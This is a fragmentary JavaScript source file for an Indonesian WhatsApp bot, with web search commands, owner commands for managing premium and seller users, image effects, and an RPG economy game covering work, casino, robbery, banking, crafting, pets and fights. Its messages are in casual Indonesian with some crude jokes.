var capt = `❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}
🔎 Search : ${q}
Maaf, tidak ada hasil yang ditemukan.`
yoshcss.sendMessage(m.chat, capt, { quoted: m })
}
})
break
//=================================================//
case 'google-article': {
if (!q) return yoshreply (`Example : ${m.prefix + m.command} penis`)
...
case 'search-kbbi': {
//inireact();
if (!q) return yoshreply(`Example: ${m.prefix + m.command} persuasif`);
var response = await fetch(`https://dikaardnt.com/api/search/kbbi?q=${q}`);
var data = await response.text();
yoshreply(`📝 Result : ${data}`)
}
break
//=================================================//
case 'search-apk': {
if (!q) return yoshreply (`Example : ${m.prefix + m.command} whatsapp`)
...
`;
await yoshcss.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break
//=================================================//
case 'search-sticker': {
if (!q) return yoshreply (`Example : ${m.prefix + m.command} kururmi`)
...
case 'search-resep': {
//inireact();
if (!q) return yoshreply(`Contoh: ${m.prefix + m.command} sambal`);
...
if (!isDeveloper) return yoshreply(mess.owner)
if (args.length < 2)
return yoshreply(`Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
yoshreply("Sukses Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
yoshreply("Sukses Via Nomer")
await sleep(2000)
yoshcss.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
}
}
break
//=================================================//
case 'delprem': {
if (!isDeveloper) return yoshreply(mess.owner)
if (args.length < 1) return yoshreply(`Penggunaan :\n*#delprem* @tag\n*#delprem* nomor`)
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
...
yoshreply("Sukses Via Nomer")
await sleep(2000)
yoshcss.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
} else {
yoshreply("Entitas premium tidak ditemukan")
}
}
}
break
...
case 'addbadwords': {
if (!isDeveloper) return yoshreply(mess.owner)
if (!text) return yoshreply(`Penggunaan ${prefix+command} anjing`)
addbadwords(text)
}
break
//=================================================//
...
case 'addowner': {
if (!isDeveloper) return yoshreply(mess.owner)
if (!args[0]) return yoshreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await yoshcss.onWhatsApp(prem1 + `@s.whatsapp.net`)
...
yoshreply(`${prem1} Sudah menjadi kontributor!!!`)
yoshcss.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qpay})
}
break
//=================================================//
case 'delowner': {
...
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(kontributor))
yoshreply(`${prem2} Tidak lagi Kontributor!!!`)
}
break
//=================================================//
case 'addseller':
...
yoshreply(`${prem1} Sudah menjadi orgkaya!!!`)
await sleep(3500)
yoshcss.sendMessage(prem1 + '@s.whatsapp.net', {
...
fs.writeFileSync('./dtbs/seller.json', JSON.stringify(orgkaya))
yoshreply(`${prem2} Tidak lagi Reseller!!!`)
break
...
.then(({data}) => {
yoshcss.sendMessage(m.chat, { image: {url: data.url }, caption: '✅Succes, Tapi Lu jan ngaceng Woi' },{quoted: m })
})
}
break
//=================================================//
...
case 'galaxystyle':
case 'lighteffects':{
if (!q) return yoshreply(`Example : ${prefix+command} yoshcss`) 
yoshreply(mess.wait)
let link
...
yoshcss.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
case 'shadow': 
...
yoshcss.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
...
yoshcss.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
//=================================================//
case 'kiss': {
if (m.mentionedJid[0] === m.sender) return yoshreply(`gabisa bego`)
if (!m.mentionedJid[0]) return yoshreply(`Contoh : ${prefix}kiss @${kontributor[1]}`, m.chat, { mentions: [kontributor[1] + '@s.whatsapp.net'] })
let mmk = await fetch(`https://api.waifu.pics/sfw/kiss`)
let data = await mmk.json()
await yoshcss.sendVideoAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author });
await yoshcss.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Mencium @${m.mentionedJid[0].split("@")[0]}`, contextInfo: { mentionedJid: [m.sender, m.mentionedJid], groupMentions: [{ groupJid: m.chat, groupSubject: 'anjay' }] } }, { quoted: m });
}
break
//=================================================//
case 'hug': {
if (m.mentionedJid[0] === m.sender) return yoshreply(`gabisa bego`)
if (!m.mentionedJid[0]) return yoshreply(`Contoh : ${prefix}hug @${kontributor[1]}`, m.chat, { mentions: [kontributor[1] + '@s.whatsapp.net'] })
let mmk = await fetch(`https://api.waifu.pics/sfw/kiss`)
let data = await mmk.json()
await yoshcss.sendVideoAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author });
await yoshcss.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Memeluk @${m.mentionedJid[0].split("@")[0]}`, contextInfo: { mentionedJid: [m.sender, m.mentionedJid], groupMentions: [{ groupJid: m.chat, groupSubject: 'anjay' }] } }, { quoted: m });
}
break
//=================================================//
case 'nebang': {
if (!isGroup) return yoshreply(mess.ingroup)
...
if (new Date - user.lastparming < 1800000) return yoshreply(`Anda sudah lelah untuk bekerja\nTunggu selama ${msToTime(time - new Date())} lagi`)
let wood = `${Math.floor(Math.random() * 50)}`.trim()
let money = `${Math.floor(Math.random() * 50000)}`.trim()
user.wood += wood * 1
user.money += money * 1
user.lastparming = new Date * 1
yoshreply(`Selamat kamu mendapatkan : \n+${wood} Kayu\n+${money} Money`)
}
break
//=================================================//
case 'casino': {
...
let buatall = 1
yoshcss.casino = yoshcss.casino ? yoshcss.casino : {}
if (m.chat in yoshcss.casino) return reply ('Masih ada yang melakukan casino disini, tunggu sampai selesai!!')
else yoshcss.casino[m.chat] = true
try {
...
if (args.length < 1) return yoshreply('casino <jumlah>\n ' + 'casino 1000', )
if (db.data.users[m.sender].exp >= count * 1) {
db.data.users[m.sender].exp -= count * 1
//await yoshreply('') //Kwkwwkkwlwlw
if (Aku > Kamu) {
...
} else yoshreply(`Uang(xp) kamu tidak mencukupi untuk Casino silahkan *#kerja* terlebih dahulu!`)
} catch (e) {
console.log(e)
yoshreply('Error!!')
if (DevMode) {
for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != yoshcss.user.jid)) {
yoshcss.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
}
}
} finally {
delete yoshcss.casino[m.chat]
}
}
break
//=================================================//
...
users.lastparming = new Date * 1
yoshreply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} ${global.rpg.emoticon('money')}*`)
break
default:
return yoshreply(`_*Pilih Pekerjaan Yang Kamu Inginkan*_\n\n_• Kuli_ \n_• Montir_ \n_• Petani_ \n_• Dokter_ \n_• Pedagang_ \n_• Ojek_ \n\nContoh Penggunaan :\nkerja Kuli`)
}
}
}
break
...
case 'bankcek': {
if (!isGroup) return yoshreply(mess.ingroup)
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0]: m.fromMe ? yoshcss.user.jid: m.sender
if (!(who in db.data.users)) return m.yoshreply(`User ${who} not in database`)
...
let caption = `
▧「 *BANK CEK* 」
│ 👤 Name: ${user.registered ? user.name: yoshcss.getName(m.sender)}
...
if (user.money < 1000) {
return yoshreply(`Uang Anda Harus Diatas Seribu Untuk Menggunakan Command Ini`);
}
...
user.lastbansos = new Date() * 1;
return yoshreply(`Sorry Gan Lu g Berhasil Korupsi bansos Dan Tidak masuk penjara karna Kamu *melarikan diri🏃*`);
}
} else {
return yoshreply(`Silahkan Menunggu Beberapa Menit Untuk bansos Lagi`);
}
}
break;
...
let timers = clockString(_timers)
let name = yoshcss.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Taxy'
yoshcss.misi = yoshcss.misi ? yoshcss.misi : {}
if (id in yoshcss.misi) {
yoshreply(`Selesaikan Misi ${yoshcss.misi[id][0]} Terlebih Dahulu`)
throw false
}
...
setTimeout(() => {
yoshreply('🔍Mencari pelanggan.....')
}, 0)
user.lastmisi = new Date * 1
} else yoshreply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=================================================//
case 'leaderboard': {
...
return await yoshreply('*––––『 𝙻𝙴𝙰𝙳𝙴𝚁𝙱𝙾𝙰𝚁𝙳 』––––*\n' + wrong, {
contextInfo: {
...
${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: yoshcss.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
return await yoshreply(text,{
contextInfo: {
...
if (new Date - user.lastmulung < 1800000) return yoshreply(`Anda sudah lelah untuk mulung\nTunggu selama ${msToTime(time - new Date())} lagi`)
...
yoshcss.misi = yoshcss.misi ? yoshcss.misi : {}
if (id in yoshcss.misi) {
return yoshreply( `Selesaikan Misi ${yoshcss.misi[id][0]} Terlebih Dahulu`)
 }
if (new Date - user.lastmisi > 3600000) {
...
let hsl = `🕸 *Hasil Berburu ${user.registered ? user.name : yoshcss.getName(m.sender)}* 
${hewan1 ? `
...
setTimeout(() => {
yoshreply('Dapat Sasaran')
}, 14000)

setTimeout(() => {
yoshreply('Sedang mencari mangsa...')
}, 0)
user.lastmisi = new Date * 1
} else yoshreply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
...
if (!who) return yoshreply ('Tag salah satu lah, yang kamu ingin berdagang bareng')
if (typeof db.data.users[who] == 'undefined') return yoshreply('Pengguna tidak ada didalam data base')
let __timers = (new Date - db.data.users[m.sender].lastdagang)
let _timers = (28800000 - __timers)
let timers = clockString(_timers)
let users = db.data.users
let username = yoshcss.getName(who)
if (new Date - db.data.users[m.sender].lastdagang > 28800000) {
if (4999 > users[who].money) return yoshreply ('Target tidak memiliki modal harap masukkan modal 5000')
if (4999 > users[m.sender].money) return yoshreply ('kamu tidak memiliki modal harap masukkan modal 5000')
users[who].money -= dapat * 1
users[m.sender].money -= dapat * 1
db.data.users[m.sender].lastdagang = new Date * 1
yoshreply(`Mohon tunggu kak..\nKamu dan @${who.replace(/@.+/, '')} sedang berdagang.. ðŸ˜…\n\nKamu dan @${who.replace(/@.+/, '')} meletakkan modal -${dapat} ðŸ˜…`)
setTimeout(() => {
yoshreply(m.chat, `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, m, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 3600000)
setTimeout(() => {
yoshreply(`Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 7200000)
...
} else yoshreply(`Anda Sudah Berdagang , tunggu ${timers} lagi..`)
...
if (!who) return yoshreply('Tag orang yang mau kamu Rampok!');
if (users[who].level > users[m.sender].level) return yoshreply(`Level kamu harus lebih tinggi dari @${who.split('@')[0]} Untuk bisa merampoknya!`, false, { mentions: [who] })
let __timers = (new Date - db.data.users[m.sender].lastrampok)
let _timers = (3600000 - __timers)
let timers = clockString(_timers)
if (new Date - db.data.users[m.sender].lastrampok > 3600000) {
if (10000 > users[who].money) return yoshreply('ᴛᴀʀɢᴇᴛ ɢᴀᴀᴅᴀ 💰ᴜᴀɴɢ ʙᴏᴅᴏʜ, ᴋɪꜱᴍɪɴ ᴅɪᴀ')
users[who].money -= dapat * 1
users[m.sender].money += dapat * 1
db.data.users[m.sender].lastrampok = new Date * 1
yoshreply( `ʙᴇʀʜᴀꜱɪʟ ᴍᴇʀᴀᴍᴘᴏᴋ ᴍᴏɴᴇʏ ᴛᴀʀɢᴇᴛ ꜱᴇʙᴇꜱᴀʀ 💰${dapat}`)
} else yoshreply( `Anda Sudah merampok dan berhasil sembunyi , tunggu ${timers} untuk merampok lagi`)
}
break
//=================================================//
case 'banknabung': {
if (!isGroup) return yoshreply(mess.ingroup)
if (!q) return yoshreply(`_*Anda Tidak Menginput Jumlah Uang Yang Ingin Ditabung*_
...
if (count <= 0) return yoshreply('Kamu tidak memiliki cukup uang untuk menabung.')
if (user.atm == 0) return yoshreply('kamu belum mempunyai kartu ATM')
if (user.bank > user.fullatm) return yoshreply('Uang Di ATM sudah penuh!')
if (count > user.fullatm - user.bank) return yoshreply('Uangnya nya sudah mencapai batas')
if (user.money >= xpperlimit * count) {
user.money -= xpperlimit * count
user.bank += count
yoshreply(`Sukses menabung sebesar ${count} Money 💹`)
} else {
return
}
}
...
case 'banktarik': {
if (!isGroup) return yoshreply(mess.ingroup)
if (!q) return yoshreply(`_*Anda Tidak Menginput Jumlah Uang Yang Ingin Ditarik*_
...
if (count <= 0) return yoshreply('Kamu tidak memiliki cukup uang untuk menabung.')
if (user.atm == 0) return yoshreply('kamu belum mempuyai kartu ATM !')
if (user.bank >= xpperlimit * count) {
user.bank -= xpperlimit * count
user.money += count
yoshreply(`Sukses menarik sebesar ${count} Money 💹`)
} else {
return
}
}
...
let kerja = 'Berkebun'
let id = m.chat
.misi = yoshcss.misi ? yoshcss.misi : {}
if (id in yoshcss.misi) {
yoshreply(`Selesaikan Misi ${yoshcss.misi[id][0]} Terlebih Dahulu`)
return false
}
...
setTimeout(() => {
yoshreply(`${caption.trim()}`)
}, 20000)

setTimeout(() => {
yoshreply('Sedang Menanam Bibit...')
}, 0)
user.lastberkebon = new Date * 1
} else yoshreply(`${caption}`)
} else yoshreply(`Mohon Menunggu Selama ${timers} Untuk Berkebun Kembali...`)
}
break
//=================================================//
case 'bet': {
...
if (!item.includes(type)) return yoshreply(`*List Item:*\n${item.map(v => `${global.rpg.emoticon(v)}${v}`.trim()).join('\n')}\n\nExample:\nbet money 100000`)
if ((user[type] * 1) < count) return yoshreply(`*${type} ${global.rpg.emoticon(type)}* kamu tidak cukup!!`)
...
yoshreply('Error saat melakukan judi (Rejected)')
}
}
break
//=================================================//
...
if (new Date - user.lastbonus < 86400000) return yoshreply(`Kamu Sudah Ambil Bonus Hari Ini\nTunggu selama ${msToTime(time - new Date())} lagi`)
let money = Math.floor(Math.random() * 50000000)
user.money += money * 1
user.lastbonus = new Date * 1
yoshreply(`Selamat Kamu Mendapatkan Bonus : \n+${money} Money`)
}
break
//=================================================//
case 'buah': {
...
setTimeout(() => {
yoshreply('🔍Mencari Target pembunuhan.....')
}, 0)
user.lastmisi = new Date * 1
} else yoshreply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
...
yoshreply(`Kamu sudah mengclaim dan mendapatkan *1000* 💵money dan *1* 🥤potion`)
user.money += 1000
user.potion += 1
user.lastclaim = new Date * 1
} else yoshreply(`silahkan tunggu *${timers}* lagi untuk bisa mengclaim lagi`)
}
break
//=================================================//
case 'craft':
...
switch (type) {
case 'pickaxe':
if (user.pickaxe > 0) return yoshreply('Kamu sudah memilik ini')
if(user.rock < 5 || user.wood < 10 || user.iron < 5 || user.string < 20) return yoshreply(`Barang tidak cukup!\nUntuk membuat pickaxe. Kamu memerlukan : ${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''} ${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}${user.rock < 5 ? `\n${5 - user.rock} Batu 🪨` : ''}`)
user.wood -= 10
stock.wood += 10
...
yoshreply("Sukses membuat 1 pickaxe 🔨")
break
//=================================================//
case 'sword':
if (user.sword > 0) return yoshreply('Kamu sudah memilik ini')
if(user.wood < 10 || user.iron < 15) return yoshreply(`Barang tidak cukup!\nUntuk membuat sword. Kamu memerlukan :${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''}${user.iron < 15 ? `\n${15 - user.iron} iron⛓️` : ''}`)
user.wood -= 10
stock.wood += 10
...
yoshreply("Sukses membuat 1 sword 🗡️")
break
//=================================================//
case 'fishingrod':
if (user.fishingrod > 0) return yoshreply('Kamu sudah memilik ini')
if(user.wood < 20 || user.iron < 5 || user.string < 20) return yoshreply(`Barang tidak cukup!\nUntuk membuat pancingan. Kamu memerlukan :${user.wood < 20 ? `\n${20 - user.wood} kayu🪵` : ''}${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}`)
user.wood -= 10
stock.wood += 10
...
yoshreply("Sukses membuat 1 Pancingan 🎣")
break
//=================================================//
case 'armor':
if (user.armor > 0) return yoshreply('Kamu sudah memilik ini')
if(user.iron < 30 || user.emerald < 1 || user.diamond < 5) return yoshreply(`Barang tidak cukup!\nUntuk membuat armor. Kamu memerlukan :${user.iron < 30 ? `\n${30 - user.iron} Iron ⛓️` : ''}${user.emerald < 1 ? `\n${1 - user.emerald} Emerald ❇️` : ''}${user.diamond < 5 ? `\n${5 - user.diamond} Diamond 💎` : ''}`)
user.emerald -= 1
stock.emerald += 1
...
yoshreply("Sukses membuat 1 Armor 🥼")
break
//=================================================//
case 'atm':
if (user.atm > 0) return yoshreply('Kamu sudah memilik ini')
if(user.emerald < 3 || user.money < 10000 || user.diamond < 6) return yoshreply(`Barang tidak cukup!\nUntuk membuat atm. Kamu memerlukan :${user.money < 10000 ? `\n${10000 - user.money} Money 💹` : ''}${user.emerald < 3 ? `\n${3 - user.emerald} Emerald ❇️` : ''}${user.diamond < 6 ? `\n${6 - user.diamond} Diamond 💎` : ''}`)
user.emerald -= 3
stock.emerald += 3
...
yoshreply("Sukses membuat 1 Atm 💳")
break
default:
return await yoshreply(`${caption}`)
}
} 
} catch (err) {
yoshreply("Error\n\n\n" + err.stack)
...
switch (type) {
case 'fox':
if (rubah == 0) return yoshreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (rubah == 10) return yoshreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
...
yoshreply(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
if (rubah > 0) {
let naiklvl = ((rubah * 100) - 1)
if (user.foxexp > naiklvl) {
user.fox += 1
user.foxexp -= (rubah * 100)
yoshreply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else yoshreply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else yoshreply(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktur}*`)
break
//=================================================//
case 'cat':
if (kucing == 0) return yoshreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (kucing == 10) return yoshreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
...
//=================================================//
case 'dog':
if (anjing == 0) return yoshreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (anjing == 10) return yoshreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
...
//=================================================//
case 'horse':
if (kuda == 0) return yoshreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (kuda == 10) return yoshreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
...
//=================================================//
case 'robo':
if (robot == 0) return yoshreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (robot == 10) return yoshreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
...
case 'fighting':
 case 'fight': {
 if (!isGroup) return yoshreply(mess.ingroup)
yoshcss.fight = yoshcss.fight ? yoshcss.fight: {}
let user = db.data.users[m.sender]
if (typeof yoshcss.fight[m.sender] != "undefined" && yoshcss.fight[m.sender] == true) return yoshreply(`Kamu masih bertarung.`)
...
yoshreply(`*Kamu* (level ${user.level}) menantang *${yoshcss.getName(lawan)}* (level ${db.data.users[lawan].level}) dan sedang dalam pertarungan.\n\nTunggu 5 menit lagi dan lihat siapa yg menang.`)
yoshcss.fight[m.sender] = true
await delay(300000)
let kesempatan = []
...
user.money += hadiah
user.limit += 1
yoshreply(`*${yoshcss.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${yoshcss.getName(lawan)}*\n\n*Kamu* (level ${user.level}) menang melawan *${yoshcss.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanMenang[getRandom(0, alasanMenang.length - 1)]}\n\nHadiah . ${hadiah.toLocaleString()}\n+1 Limit`)
} else if (pointPemain < pointLawan) {
let denda = (pointLawan - pointPemain) * 100000
user.money -= denda
user.limit += 1
yoshreply(`*${yoshcss.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${yoshcss.getName(lawan)}*\n\n*Kamu* (level ${user.level}) kalah melawan *${yoshcss.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanKalah[getRandom(0, alasanKalah.length - 1)]}\n\nMoney kamu berkurang ${denda.toLocaleString()}\n+1 Limit`)
} else {
yoshreply(`*${yoshcss.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${yoshcss.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa`)
}
delete yoshcss.fight[m.sender]
}
break
//=================================================//
case 'gajian': {
...
yoshreply('Nih gaji lu +Rp50000')
db.data.users[m.sender].lastclaim = new Date * 1
} else return yoshreply(`Lu udah ambil jatah hari ini.\n\nTunggu ${cd1} Menit ${cd2} Detik!`)
}
break
//=================================================//
case 'me':
...
if (!(who in db.data.users)) return yoshreply(`User ${who} not in database`)
...
let isMods = [yoshcss.decodeJid(yoshcss.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isDeveloper = m.fromMe || isMods || [yoshcss.decodeJid(yoshcss.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && !isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isPrems = isDeveloper || new Date() - user.premiumTime < 0
...
let caption = `
🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : yoshcss.getName(who)}* ${user.level ? `
...
yoshreply(`Succes mengupgrade *${rpg.emoticon('fishingrod')}FishingRod*`)
break
//=================================================//
case 'pickaxe':
if (pickaxe == 0) {
...
if (pickaxe > 9) return yoshreply(`*${rpg.emoticon('pickaxe')}Pickaxe* kamu sudah level max!!`)
let __rock = pickaxe * 250
let __wood = pickaxe * 150
let __money = pickaxe * 1500000
if (rock < __rock || wood < __wood || money < __money) return yoshreply(`
...
yoshreply(`Succes mengupgrade *${rpg.emoticon('pickaxe')}Pickaxe*`)
break
//=================================================//
case 'sword':
if (sword == 0) {
...
if (sword > 9) return yoshreply(`*${rpg.emoticon('sword')}Sword* kamu sudah level max!!`)
let _iron = sword * 250
let ___wood = sword * 150
let ___money = sword * 1000000
if (iron < _iron || wood < ___wood || money < ___money) return yoshreply(`
Material Anda Kurang!!
...
yoshreply(`Succes mengupgrade *${rpg.emoticon('sword')}Sword*`)
break
//=================================================//
case 'armor':
if (armor == 0) {
...
if (armor > 9) return yoshreply(`*${rpg.emoticon('armor')}Armor* kamu sudah level max!!`)
let _diamond = armor * 5
let ____wood = armor * 150
let ____money = armor * 1000000
if (diamond < _diamond || wood < ____wood || money < ____money) return yoshreply(`
Material Anda Kurang!!
...
yoshreply(`Succes mengupgrade *${rpg.emoticon('armor')}Armor*`)
break
//=================================================//
case 'atm':
if (atm == 0) {
...
if (atm > 999) return yoshreply(`*${rpg.emoticon('atm')}Atm* kamu sudah level max!!`)
let __diamond = atm * 3
let _emerald = atm * 5
let _____money = atm * 10000
if (diamond < __diamond || emerald < _emerald || money < _____money) return yoshreply(`
Material Anda Kurang!!
...
yoshreply(`Succes mengupgrade *${rpg.emoticon('atm')}Atm*`)
break
default :
return yoshreply(`${teks}`)
}
}
break
//=================================================//
...
if (!item.includes(type)) return yoshreply(lol)
const count = Math.min(Number.MAX_SAFE_INTEGER, Math.max(1, (isNumber(args[1]) ? parseInt(args[1]) : 1))) * 1
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[2] ? (args[2].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let _user = db.data.users[who]
if (!who) return yoshreply('Tag salah satu, atau ketik Nomernya!!')
if (!(who in db.data.users)) return yoshreply(`User ${who} not in database`)
if (user[type] * 1 < count) return yoshreply(`Your *${rpg.emoticon(type)}${type}${special(type)}* is less *${count - user[type]}*`)
let previous = user[type] * 1
let _previous = _user[type] * 1
user[type] -= count * 1
_user[type] += count * 1
if (previous > user[type] * 1 && _previous < _user[type] * 1) yoshreply(`*––––––『 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁 』––––––*\n*📊 Status:* Succes\n*🗂️ Type:* ${type}${special(type)} ${rpg.emoticon(type)}\n*🧮 Count:* ${count}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
else {
user[type] = previous
...
if (!item.match('limit') && db.chats[m.chat].rpg == false && isGroup) return dfail('rpg', m, yoshcss)
let user = db.data.users[m.sender]
...
if (!listItems[item]) return yoshreply(footer)
if (command.toLowerCase() == 'buy') {
let paymentMethod = Object.keys(listItems[item]).find(v => v in user)
if (user[paymentMethod] < listItems[item][paymentMethod] * total) return yoshreply(`Kamu membutuhkan *${(listItems[item][paymentMethod] * total) - user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)} Lagi, Untuk Membeli *${total}* ${capitalize(item)} ${rpg.emoticon(item)}. Kamu hanya memiliki *${user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}.`)
user[paymentMethod] -= listItems[item][paymentMethod] * total
user[item] += total
return yoshreply(`Sukses Membeli *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethod] * total} ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}*`)
} else {
let paymentMethot = Object.keys(listItems[item]).find(v => v in user)
if (user[item] < total) return yoshreply(`You don't have enough *${capitalize(item)} ${rpg.emoticon(item)}* to sell, you only have ${user[item]} items`)
user[item] -= total
user[paymentMethot] += listItems[item][paymentMethot] * total
return yoshreply(`Sukses Menjual *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethot] * total} ${capitalize(paymentMethot)} ${rpg.emoticon(paymentMethot)}*`)
}
}
break
//=================================================//
...
"Enam": "⭐⭐⭐⭐⭐⭐"
 ...
 if (!skill.includes(skil)) return yoshreply( `Select *skill🃏* what do you want/pilih skill apa yg kamu inginkan:
...
if (user.skill == "") {
user.skill = skil
yoshreply(`Anda telah memilih Skill ${skil}`)
} else if (user.skill) {
yoshreply(`Anda Sudah Punya skill ${user.skill} Tidak bisa diganti`)
}
}
break
//=================================================//
...
let user = db.data.users[m.sender]
if (new Date - user.lastmonthly < cooldown) return yoshreply( `You have already claimed this monthly claim, wait for *${((user.lastmonthly + cooldown) - new Date()).toTimeString()}*`.trim())
let text = ''
...
let timers = clockString(_timers)
let name = user.registered ? user.name: yoshcss.getName(m.sender)
let id = m.sender
let kerja = 'Roket'
yoshcss.misi = yoshcss.misi ? yoshcss.misi: {}
if (id in yoshcss.misi) {
...
if (user.health < 80) return yoshreply(`Anda Harus Memiliki Minimal 80Health`)
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
...
switch (type) {
case 'pickaxe':
if (user.pickaxedurability > 99) return yoshreply('Tools ini belum memiliki kerusakan')
